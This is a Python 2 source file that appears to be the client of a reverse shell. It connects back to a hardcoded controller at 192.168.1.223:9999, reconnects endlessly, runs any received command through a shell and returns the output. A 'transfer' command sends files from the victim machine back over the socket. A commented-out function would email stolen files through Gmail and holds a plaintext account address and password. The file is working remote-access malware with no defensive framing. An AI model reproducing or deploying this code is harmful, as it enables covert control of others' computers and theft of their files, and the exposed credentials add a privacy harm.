import os
import socket
import subprocess
import time
import sys
import smtplib
from GetIP import get_lan_ip
from email import *
import datetime
import threading
from threading import Thread


def socket_create():
    """
    The function creates socket (allows two computers to connect)


    :return: None
    """
    try:
        global host
        global port
        global s
        host = '192.168.1.223'
        # host = get_lan_ip()
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print('Socket creation error: ' + str(msg))


def socket_connect():
    """
    The function connects to a remote socket


    :return: None
    """
    try:
        global host
        global port
        global s
        # print('Binding socket to port: ' + str(port))
        s.connect((host, port))
    except socket.error as msg:
        print('Socket connection error: ' + str(msg))
        time.sleep(5)
        socket_connect()


def send_file(file_path):
    """
    The function sends a file to the server

    :param file_path: The path of the file we want to send
    :type file_path: str

    :return: None
    """
    f = open(str(file_path), 'rb')
    print 'Sending...'
    l = f.read(1024)
    while (l):
        print 'Sending...'
        s.send(l)
        l = f.read(1024)
    f.close()
    print "Done Sending"
    s.shutdown(socket.SHUT_WR)
    print s.recv(1024)


def receive_commands():
    """
    The function receives commands from the socket

    :return: None
    """
    while True:
        data = s.recv(20480)
        if data[:2].decode("utf-8") == 'cd':
            try:
                os.chdir(data[3:].decode("utf-8"))
            except:
                pass
        if data[:].decode("utf-8") == 'quit':
            s.close()
            break
        if len(data) > 0:
            # File transfer
            # """
            if data[:8].decode("utf-8") == 'transfer':
                file_name = data[9:].decode("utf-8")
                file_path = str(os.getcwd()) + chr(92) + file_name
                if not os.path.exists(file_path):
                    output_str = "The file does not exist" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
                else:
                    try:
                        send_file(file_path)
                    except:
                        output_str = "Could not transfer the file" + "\n"
                        s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                        print(output_str)

            # """
            # The rest of commands
            else:
                try:
                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = str(output_bytes)
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print output_str
                except:
                    output_str = "Command not recognized" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
    s.close()


"""
def email_file(file_path, file_name):
    """
"""
    The function sends the file requested via email

    :param file_path: The path of the file we're trying to send
    :type file_path: str

    :param file_name: The name of the file we're trying to send
    :type file_name: str

    :return: None
"""
"""
from_address = "ovedimperia@gmail.com"
to_address = "ovedimperia@gmail.com"

msg = MIMEMultipart()

msg['From'] = from_address
msg['To'] = to_address
msg['Subject'] = "File_Transfer From: {} At {}".format(str(get_lan_ip()),
                                                       str(
                                                           datetime.datetime.now()))
email_body = "A successful file transfer"

msg.attach(MIMEText(email_body, 'plain'))

attachment = open(str(file_path), "rb")

part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',
                "attachment; filename= %s" % file_name)

msg.attach(part)

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(from_address, "ovedimperia1")
text = msg.as_string()
server.sendmail(from_address, to_address, text)
server.quit()
"""


def main():
    global s
    try:
        socket_create()
        socket_connect()
        receive_commands()
    except:
        print("Error in main")
        time.sleep(5)
    s.close()
    main()


if __name__ == '__main__':
    main()
